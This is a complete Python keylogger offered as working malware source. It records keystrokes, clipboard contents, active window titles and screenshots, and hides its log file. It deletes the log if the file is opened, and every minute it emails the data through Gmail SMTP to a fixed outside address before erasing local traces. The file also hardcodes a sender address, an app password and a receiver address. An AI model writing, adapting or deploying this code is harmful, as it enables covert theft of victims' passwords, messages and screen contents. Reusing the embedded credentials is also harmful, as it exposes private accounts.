import os
import time
import psutil
import pyperclip
import platform
import subprocess
import threading
import smtplib
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from pynput import keyboard
from email import encoders

# Log file path
LOG_FILE = os.path.join(os.getcwd(), ".keystrokes.log")
SCREENSHOT_DIR = os.path.join(os.getcwd(), ".screenshots")
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# Hide log file
def hide_log_file():
    try:
        if platform.system() == "Windows":
            subprocess.run(["attrib", "+h", LOG_FILE], check=True)
        elif platform.system() == "Linux":
            hidden_log = os.path.join(os.getcwd(), ".keystrokes.log")
            os.rename(LOG_FILE, hidden_log)
            return hidden_log
    except Exception as e:
        print(f"[!] Failed to hide log file: {e}")
    return LOG_FILE

# Create log file and hide it
with open(LOG_FILE, 'w') as file:
    file.write(f"[*] Keylogger started at {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")

LOG_FILE = hide_log_file()

last_active_window = ""
ctrl_pressed = False
running = True  

# Email configuration
SENDER_EMAIL = "testingproject012@gmail.com"     # sender mail address   
SENDER_PASSWORD = "xkuz emqf fgkv rncy"         # Use Google App Password
RECEIVER_EMAIL = "arunudhayan27@gmail.com"      # receiver mail address
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# Send email function and delete log file after sending
def send_mail():
    try:
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = "Keystroke Log Report"

        msg.attach(MIMEText("Attached is the latest keystroke logs and screenshots.", 'plain'))
        
        # Attach log file
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(LOG_FILE)}")
                msg.attach(part)

        # Attach screenshot
        screenshot_file = capture_screenshot()
        if screenshot_file and os.path.exists(screenshot_file):
            with open(screenshot_file, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(screenshot_file)}")
                msg.attach(part)

        # Send email
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        server.quit()

        print("[+] Log file sent successfully.")

        # Delete log file after sending
        os.remove(LOG_FILE)

        # Delete screenshots after sending
        for file in os.listdir(SCREENSHOT_DIR):
            file_path = os.path.join(SCREENSHOT_DIR, file)
            os.remove(file_path)

        print("[+] Log file and screenshots deleted after sending email.")

    except Exception as e:
        print(f"[!] Failed to send email: {e}")

# Monitor file access and delete after 30 seconds if opened
def monitor_file_access():
    initial_time = os.path.getatime(LOG_FILE)  # Get last accessed time

    while running:
        try:
            current_time = os.path.getatime(LOG_FILE)
            if current_time != initial_time:
                print("[!] Log file opened! Deleting in 10 seconds...")
                time.sleep(10)
                os.remove(LOG_FILE)
                print("[+] Log file deleted due to unauthorized access.")
                break
            time.sleep(5)  # Check every 5 seconds
        except FileNotFoundError:
            break  # File already deleted

# Schedule email sending every interval seconds
def schedule_email(interval=60):
    while running:
        send_mail()
        time.sleep(interval)

# Capture Screenshot
def capture_screenshot():
    screenshot_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{int(time.time())}.png")
    try:
        img = ImageGrab.grab()
        img.save(screenshot_path)
        print(f"[+] Screenshot saved: {screenshot_path}")
        return screenshot_path
    except Exception as e:
        print(f"[!] Screenshot failed: {e}")
        return None

# Get active window title
def get_active_window():
    global last_active_window

    try:
        if platform.system() == "Windows":
            import win32process
            import pygetwindow as gw

            active_window = gw.getActiveWindow()
            if active_window:
                window_title = active_window.title or "Unknown"
                hwnd = active_window._hWnd
                pid = win32process.GetWindowThreadProcessId(hwnd)[-1]
                process_name = psutil.Process(pid).name()

                window_info = f"{window_title} - {process_name}"
                if window_info != last_active_window:
                    last_active_window = window_info
                    return f"\n\n[Application: {window_info} - {time.strftime('%H:%M:%S')}]\n"

        elif platform.system() == "Linux":
            result = subprocess.run(["xdotool", "getwindowfocus", "getwindowname"], capture_output=True, text=True)
            window_title = result.stdout.strip()
            if window_title != last_active_window:
                last_active_window = window_title
                return f"\n\n[Application: {window_title} - {time.strftime('%H:%M:%S')}]\n"

        return ""

    except Exception as e:
        return f"\n[Error retrieving window: {e}]\n"

# Save log data
def save_log(data):
    with open(LOG_FILE, "a") as file:
        file.write(data)

# Key press handler
def on_press(key):
    global ctrl_pressed, running

    if key == keyboard.Key.esc:
        print("\n[+] Keylogger Stopped.")
        running = False
        return False

    log_entry = get_active_window()

    try:
        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            ctrl_pressed = True
            return

        if ctrl_pressed and hasattr(key, 'char'):
            if key.char == 'v':
                pasted_text = pyperclip.paste() or "[Empty Clipboard]"
                log_entry += f"\n[Pasted]: {pasted_text}\n"
            elif key.char == 'c':
                copied_text = pyperclip.paste() or "[Empty Clipboard]"
                log_entry += f"\n[Copied]: {copied_text}\n"
            save_log(log_entry)
            return

        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.backspace: "[Backspace]",
            keyboard.Key.tab: "[Tab]",
            keyboard.Key.delete: "[Del]"
        }

        if key in special_keys:
            log_entry += special_keys[key]
        elif hasattr(key, 'char') and key.char:
            log_entry += key.char

        save_log(log_entry)

    except Exception as e:
        save_log(f"\n[Error logging key: {e}]\n")

# Start keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Main execution
if __name__ == "__main__":
    print(f"[*] Keylogger Started. Keystrokes & Clipboard will be saved in: {LOG_FILE}")

    threading.Thread(target=schedule_email, daemon=True).start()
    threading.Thread(target=monitor_file_access, daemon=True).start()

    start_keylogger()
